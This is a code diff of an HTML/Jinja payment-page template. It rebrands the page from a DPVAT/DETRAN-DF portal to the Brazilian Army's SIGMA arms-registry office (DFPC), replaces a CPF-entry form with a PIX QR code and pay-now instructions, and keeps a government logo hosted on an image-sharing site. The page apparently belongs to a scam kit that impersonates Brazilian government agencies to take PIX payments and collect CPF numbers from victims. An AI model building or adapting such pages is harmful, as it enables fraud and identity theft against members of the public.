@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal DPVAT - Pagamento</title>
+    <title>SIGMA - Pagamento PIX</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -19,12 +19,6 @@
             font-family: 'rawline', sans-serif;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .animate-spin {
-            animation: spin 1s linear infinite;
         }
     </style>
     <script>
@@ -48,10 +42,13 @@
                 <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
                 <div>
                     <p class="text-black text-[10px] leading-tight">
-                        SECRETARIA DE ESTADO DE ECONOMIA
+                        EXÉRCITO BRASILEIRO
                     </p>
-                    <p id="state-text" class="text-black text-[10px] leading-tight font-bold">
-                        DETRAN - Distrito Federal
+                    <p class="text-black text-[10px] leading-tight font-bold">
+                        COMANDO LOGÍSTICO - COLOG
+                    </p>
+                    <p class="text-black text-[10px] leading-tight">
+                        DIRETORIA DE FISCALIZAÇÃO DE PRODUTOS CONTROLADOS
                     </p>
                 </div>
             </div>
@@ -69,83 +66,72 @@
                     <div class="w-1.5 h-1.5 bg-white"></div>
                 </div>
             </button>
-            <span class="text-white text-xl drop-shadow-sm">PAGAMENTO DPVAT</span>
+            <span class="text-white text-xl drop-shadow-sm">PAGAMENTO PIX</span>
         </div>
     </div>
 
     <!-- Main Content -->
     <div class="container mx-auto px-4 py-8">
-        <div class="max-w-md mx-auto bg-white rounded-lg shadow-md p-6">
-            <form id="cpfForm" action="{{ url_for('validar_cpf') }}" method="POST">
-                <div class="mb-6">
-                    <label class="block text-gray-700 text-sm font-bold mb-2" for="cpf">
-                        Digite seu CPF:
-                    </label>
-                    <div class="relative">
-                        <input class="appearance-none border rounded w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
-                               id="cpf"
-                               name="cpf"
-                               type="tel"
-                               inputmode="numeric"
-                               maxlength="14"
-                               placeholder="000.000.000-00"
-                               required />
-                        <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
-                            <i class="fas fa-id-card text-gray-500"></i>
-                        </div>
-                    </div>
-                    <p class="text-gray-600 text-xs mt-1">Digite apenas números. A formatação será automática.</p>
+        <div class="max-w-md mx-auto">
+            <div class="bg-white rounded-lg shadow-md p-6">
+                <div class="text-center mb-6">
+                    <h2 class="text-2xl font-bold text-gray-800">Pagamento via PIX</h2>
+                    <p class="text-gray-600 mt-2">Total a pagar: R$ {{ valor_total }}</p>
                 </div>
 
-                <button type="submit" id="submitBtn" class="bg-custom-blue text-white font-bold py-3 px-4 rounded w-full hover:bg-opacity-90 transition-colors flex items-center justify-center space-x-2">
-                    <span>Continuar</span>
-                    <i class="fas fa-arrow-right ml-2"></i>
-                </button>
-            </form>
-
-            {% with messages = get_flashed_messages() %}
-                {% if messages %}
-                    {% for message in messages %}
-                        <div class="mt-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative" role="alert">
-                            <span class="block sm:inline">{{ message }}</span>
+                <div class="flex flex-col items-center space-y-4">
+                    {% if pix_data.pixQrCode %}
+                        <div class="bg-gray-100 p-4 rounded-lg">
+                            <img src="{{ pix_data.pixQrCode }}" alt="QR Code PIX" class="w-48 h-48 mx-auto" />
                         </div>
-                    {% endfor %}
-                {% endif %}
-            {% endwith %}
+
+                        <div class="w-full">
+                            <p class="text-sm text-gray-600 mb-2">Código PIX:</p>
+                            <div class="relative">
+                                <input type="text" value="{{ pix_data.pixCode }}" readonly
+                                       class="w-full py-2 px-3 border rounded bg-gray-50 text-gray-700 text-sm" id="pixCode" />
+                                <button onclick="copyPixCode()" class="absolute right-2 top-1/2 transform -translate-y-1/2 text-custom-blue hover:text-opacity-80">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="text-center text-sm text-gray-600">
+                            <p class="mb-1">1. Abra o app do seu banco</p>
+                            <p class="mb-1">2. Escolha pagar via PIX</p>
+                            <p class="mb-1">3. Escaneie o QR Code ou cole o código PIX</p>
+                            <p class="mb-1">4. Confirme o valor e finalize o pagamento</p>
+                        </div>
+                    {% else %}
+                        <div class="text-red-600 text-center">
+                            <p>Erro ao gerar o QR Code PIX. Por favor, tente novamente.</p>
+                        </div>
+                    {% endif %}
+                </div>
+            </div>
         </div>
     </div>
 
     <!-- Footer -->
     <div class="bg-custom-blue text-white text-center py-3 mt-auto">
-        <p class="text-sm">© Secretaria de Estado de Economia. Todos os direitos reservados.</p>
+        <p class="text-sm">© {{ current_year }} Exército Brasileiro - DFPC. Todos os direitos reservados.</p>
+        <p class="text-sm">SIGMA - Sistema de Gerenciamento Militar de Armas</p>
     </div>
 
     <script>
-        document.getElementById('cpf').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length <= 11) {
-                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, function(regex, arg1, arg2, arg3, arg4) {
-                    if (arg4) return `${arg1}.${arg2}.${arg3}-${arg4}`;
-                    if (arg3) return `${arg1}.${arg2}.${arg3}`;
-                    if (arg2) return `${arg1}.${arg2}`;
-                    return arg1;
-                });
-                e.target.value = value;
-            }
-        });
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode');
+            pixCode.select();
+            document.execCommand('copy');
 
-        document.getElementById('cpfForm').addEventListener('submit', function(e) {
-            const submitBtn = document.getElementById('submitBtn');
-            const btnText = submitBtn.querySelector('span');
-            const btnIcon = submitBtn.querySelector('i');
-
-            // Change button appearance
-            submitBtn.classList.add('bg-opacity-75');
-            submitBtn.disabled = true;
-            btnText.textContent = 'Validando CPF...';
-            btnIcon.classList.remove('fa-arrow-right');
-            btnIcon.classList.add('fa-circle-notch', 'animate-spin');
-        });
+            // Visual feedback
+            const copyButton = pixCode.nextElementSibling;
+            const originalIcon = copyButton.innerHTML;
+            copyButton.innerHTML = '<i class="fas fa-check text-green-500"></i>';
+            setTimeout(() => {
+                copyButton.innerHTML = originalIcon;
+            }, 2000);
+        }
     </script>
 </body>
 </html>
